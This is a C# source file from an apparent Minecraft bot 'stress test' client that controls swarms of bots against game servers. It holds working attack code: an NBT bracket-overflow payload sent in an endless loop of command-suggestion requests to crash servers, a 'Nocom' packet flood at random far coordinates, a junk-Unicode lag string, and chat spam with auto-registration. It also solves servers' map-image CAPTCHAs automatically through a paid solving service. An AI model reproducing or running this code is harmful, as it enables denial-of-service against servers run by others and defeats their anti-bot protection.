﻿using System.Buffers;
using System.Collections.Concurrent;
using System.ComponentModel;
using System.Diagnostics;
using System.Reactive.Disposables;
using System.Reactive.Linq;
using System.Text.RegularExpressions;
using HolyClient.Abstractions.StressTest;
using McProtoNet;
using McProtoNet.Abstractions;
using McProtoNet.MultiVersionProtocol;
using McProtoNet.Net;
using McProtoNet.Protocol;
using McProtoNet.Protocol754;
using ReactiveUI;
using Serilog;
using SixLabors.ImageSharp;
using SixLabors.ImageSharp.Formats.Png;
using SixLabors.ImageSharp.PixelFormats;
using SixLabors.ImageSharp.Processing;
using Zennolab.CapMonsterCloud;
using Zennolab.CapMonsterCloud.Requests;

namespace HolyClient.StressTest;

public class DefaultBehavior : BaseStressTestBehavior
{
    private static Regex SayVerifyRegex = new(@"\.say \/verify (\d+)");

    private IObservable<long> StaticSpam;
    [DisplayName("Spam Enable")] public bool SpamEnable { get; set; } = true;

    [DisplayName("Spam text")]
    public BindingList<string> SpamTexts { get; set; } = new BindingList<string>
    {
        "!Hello from Minecraft Holy CLient"
    };

    [DisplayName("Fisrt text send")]
    public BindingList<string> FirstText { get; set; } = new()
    {
        "/register 21qwerty 21qwerty"
    };

    [DisplayName("Spam timeout")] public int SpamTimeout { get; set; } = 1000;
    [DisplayName("Start bot timeout")] public int StartTimeout { get; set; } = 100;

    [DisplayName("Reconnect timeout")] public int ReconnectTimeout { get; set; } = 5000;

    [DisplayName("Reconnect count")] public int Reconnects { get; set; } = 1;

    [DisplayName("Spam Nocom")] public bool SpamNocom { get; set; } = false;

    [DisplayName("Crash Completion")] public bool CrashCompletion { get; set; } = false;


    private ILogger _logger;
    private ICapMonsterCloudClient _capMonsterClient;

    public DefaultBehavior()
    {
        
    }
    public override Task Activate(CompositeDisposable disposables, IEnumerable<IStressTestBot> bots, ILogger logger,
        CancellationToken cancellationToken)
    {
        var spams = SpamTexts.ToArray();
        var first = FirstText.ToArray();
        
        
        string env = Environment.GetEnvironmentVariable("CapMonsterKey", EnvironmentVariableTarget.User);


        var clientOptions = new ClientOptions
        {
            ClientKey = env
        };
        Directory.CreateDirectory("captches");
        _capMonsterClient = CapMonsterCloudClientFactory.Create(clientOptions);


        _logger = logger;
        logger.Information("Start default behavior");
        
        Task.Run(async () =>
        {
            foreach (var bot in bots)
            {
                bot.ConfigureAutoRestart(AutoRestartAction);

                MultiProtocol proto = bot.Protocol as MultiProtocol;

                proto.OnLogin.Subscribe(async x =>
                {
                    try
                    {
                        await proto.SendClientInformation("ru", 16, 0, true, 127, 1, true, true);

                        foreach (var item in first)
                        {
                            await proto.SendChatPacket(item);
                            await Task.Delay(500);
                        }
                        
                        if (SpamNocom)
                        {
                            NocomEnable(proto);
                        }

                        if (CrashCompletion)
                        {
                            Crashing(proto);
                        }
                        
                        if (!SpamEnable)
                            return;
                        
                        

                        

                        CancellationTokenSource cts = new CancellationTokenSource();
                        Disposable.Create(() =>
                        {
                            try
                            {
                                cts.Cancel();
                            }
                            finally
                            {
                                cts.Dispose();
                            }
                        }).DisposeWith(disposables);
                        Random r = new();
                        
                        while (!cts.IsCancellationRequested)
                        {
                            string spamText = spams[r.Next(0, spams.Length)];
                            await proto.SendChatPacket($"{spamText} {r.Next(0,100):D3}" );
                            await Task.Delay(SpamTimeout, cts.Token);
                        }
                    }
                    catch (Exception exception)
                    {
                        //Console.WriteLine("Spam err: " + exception.Message);
                        // ignored
                    }
                }).DisposeWith(disposables);

                proto.OnMapItemData.Subscribe(OnMapItem).DisposeWith(disposables);

                proto.OnPosition.FirstAsync().Subscribe(async p =>
                {
                    try
                    {
                        await proto.SendPositionLook(p.X, p.Y, p.Z, p.Yaw, p.Pitch, false);
                        await proto.SendTeleportConfirm(p.TeleportId);
                    }
                    catch
                    {
                    }
                }).DisposeWith(disposables);
                if (StartTimeout > 0)
                    await Task.Delay(StartTimeout);
                bot.Restart(true);
            }
        });

        return Task.CompletedTask;
    }
    private static string generateJsonObject(int levels) {
        String ins = string.Join("", Enumerable.Range(0, levels)
                .Select(i => "["))
            ;
        return "{a:" + ins + "}";
    }
    private static int length = 2032;
    static DefaultBehavior()
    {
        string overflow = generateJsonObject(length);
        string message = "msg @a[nbt={PAYLOAD}]";
        string partialCommand = message.Replace("{PAYLOAD}", overflow);
        crashCommand = partialCommand;
    }
    private static string crashCommand;
    private void Crashing(MultiProtocol proto)
    {
        Task.Run(async () =>
        {
            try
            {
                await Task.Delay(1000);
                while (true)
                {
                    await proto.SendCommandSuggestionsRequest(0, crashCommand, false, null);
                    //await Task.Delay(100);
                }
            }
            catch (Exception ex)
            {
                //_logger.Warning(ex.Message);
            }
        });
    }

    private async void NocomEnable(MultiProtocol bot)
    {
        try
        {
            Random r = new Random();
            await Task.Delay(1000);
            int sec = 0;
            while (true)
            {
                Position loc = new Position(r.Next(-100_000, 100_000), r.Next(0, 255), r.Next(-100_000, 100_000));
                await bot.SendPlayerAction(0, loc, 0, sec++);
                await Task.Delay(100);
            }
        }
        catch (Exception ex)
        {
            //_logger.Warning(ex.Message);
        }
    }

    private async void OnMapItem(MapItemDataPacket packet)
    {
        try
        {
            if (packet.Data is not null)
            {
                int columns = packet.Data.Columns;
                int rows = packet.Data.Rows;
                using (Image<Rgba32> image = new Image<Rgba32>(columns, rows))
                {
                    for (int row = 0; row < rows; row++)
                    {
                        for (int column = 0; column < columns; column++)
                        {
                            int id = column + row * 128;
                            uint rgba = (uint)MapColor.getColorFromPackedId(packet.Data.Data[id]);
                            image[column, row] = new Rgba32(rgba);
                        }
                    }


                    string base64 = image.ToBase64String(PngFormat.Instance);

                    ImageToTextRequest request = new ImageToTextRequest
                    {
                        Body = base64,
                        Numeric = true
                    };
                    try
                    {
                        var result = await _capMonsterClient.SolveAsync(request).ConfigureAwait(false);
                        string val = result.Solution.Value;
                        string path = Path.Combine("captches", $"{val}__{Stopwatch.GetTimestamp()}.png");

                        await image.SaveAsPngAsync(path).ConfigureAwait(false);
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e);
                    }
                }
            }
        }
        catch (Exception e)
        {
            _logger.Warning(e, "Ошибка обработки каптчи");
            Console.WriteLine(e);
            //throw;
        }
    }


    private async void AutoRestartAction(IStressTestBot b)
    {
        await Task.Delay(ReconnectTimeout);
        try
        {
            await b.Restart(true);
        }
        catch (Exception ex)
        {
            // ignored
        }
    }


    private const string lagMessage =
        "null梭꿿苁ᢣ쬨?Ꮥ軉㚵龁ꥰ䙏껎娇敲\uf1fa\u2731衍\uf118쵌虎\u256d䁉횋祅\u2bd4澙봮ꆃᱨ䡮捺좢\uf7ca告쪐읭籡\u0304৫錫埅᠂\u2813蹃㵺븥鰜恂?勔\uf197盡ᑐ紒㺏\u1758筏信뉪?祉\ue160让ᐢ촯쨵\u0c01濳녂ｽ낌㾅뱝㲈敮ᱤ\u25ef风쓫谘쁫荬놙쁁\u2b39堾ἢ蟜ㅝ\u222e褉竨陼翲䗅륹\uf30e홴Ҵሾㅪ莍ආ爥果둰?蜮㟯\u032d崍퀒낢려设牢睟\ue605\u0f31෯꿍팃ꦤ愮旓ᅗⲰ틬㼰뜍둲\u206c쉬᠓\u2540靅\u1a56蠒睩咸\u17f2쉬ⶬ쭉糷ᧈ츷博苾机ꁘ굝샕ߜ杲ꏄ꾤曍ቈ㥬褞脴戰\uf876쑍뮴\u139e\uebd2鉞\ue3f9\u2205삧\uea3a綎鰞뚢嗝贫읲ᰌ퓟勘爱痟駵駙\u187a뒤\u2003ꡢ坱蔊ꊭ\uf72b滨孃㝬鿙鞸";

    private const string payload =
        "{a:[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[}";
}